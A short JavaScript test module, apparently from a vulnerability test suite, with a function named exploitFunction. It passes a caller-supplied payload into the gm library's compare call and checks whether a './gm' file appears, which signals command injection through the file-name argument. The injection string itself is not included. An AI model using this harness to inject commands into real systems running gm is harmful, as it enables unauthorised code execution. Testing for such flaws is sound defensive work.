const gm = require("gm");
const fs = require("fs");

function exploitFunction(payload) {
  const path = "./gm";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  gm.compare(payload, "/path/to/another.png", function (
    err,
    isEqual,
    equality,
    raw,
    path1,
    path2
  ) {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      // The done callback is implicitly called when fs.unlink completes
      // or an error occurs.
    });
  });
}

module.exports = { exploitFunction };